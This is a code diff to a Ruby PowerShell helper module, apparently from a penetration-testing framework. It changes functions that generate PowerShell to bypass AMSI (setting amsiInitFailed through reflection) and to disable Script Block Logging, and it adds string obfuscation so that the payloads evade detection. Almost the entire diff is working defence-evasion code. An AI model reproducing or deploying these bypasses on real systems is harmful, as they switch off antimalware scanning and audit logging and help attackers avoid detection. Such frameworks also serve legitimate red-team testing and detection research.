@@ -90,10 +90,13 @@ module Powershell
     #
     # @return [String] PowerShell code to bypass AMSI
     def self.bypass_amsi()
-      %q{
-        $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
-        $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
-      }
+      script = Script.new(<<-PSH
+        $Ref=[Ref].Assembly.GetType(#{Obfu.scate_string_literal('System.Management.Automation.AmsiUtils')});
+        $Ref.GetField(#{Obfu.scate_string_literal('amsiInitFailed')},'NonPublic,Static').SetValue($null,$true);
+        PSH
+      )
+      script.sub_vars
+      script
     end
 
     #
@@ -101,22 +104,28 @@ module Powershell
     #
     # @return [String] PowerShell code to bypass Script Block Logging
     def self.bypass_script_log()
-      %q{
-        $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
-        If($GPF){
+      script = Script.new(<<-PSH
+        $GPF=[ref].Assembly.GetType(#{Obfu.scate_string_literal('System.Management.Automation.Utils')}).GetField(#{Obfu.scate_string_literal('cachedGroupPolicySettings')},'NonPublic,Static');
+        If ($GPF) {
+            $SBL=#{Obfu.scate_string_literal('ScriptBlockLogging')};
+            $EnableSBL=#{Obfu.scate_string_literal('EnableScriptBlockLogging')};
+            $EnableSBIL=#{Obfu.scate_string_literal('EnableScriptBlockInvocationLogging')};
             $GPC=$GPF.GetValue($null);
-            If($GPC['ScriptB'+'lockLogging']){
-                $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
-                $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
+            If($GPC[$SBL]){
+                $GPC[$SBL][$EnableSBL]=0;
+                $GPC[$SBL][$EnableSBIL]=0;
             }
             $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
-            $val.Add('EnableScriptB'+'lockLogging',0);
-            $val.Add('EnableScriptB'+'lockInvocationLogging',0);
-            $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
+            $val.Add($EnableSBL,0);
+            $val.Add($EnableSBIL,0);
+            $GPC['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\'+$SBL]=$val;
         } Else {
-            [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+            [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));
         }
-      }
+        PSH
+      )
+      script.sub_vars
+      script
     end
 
     #
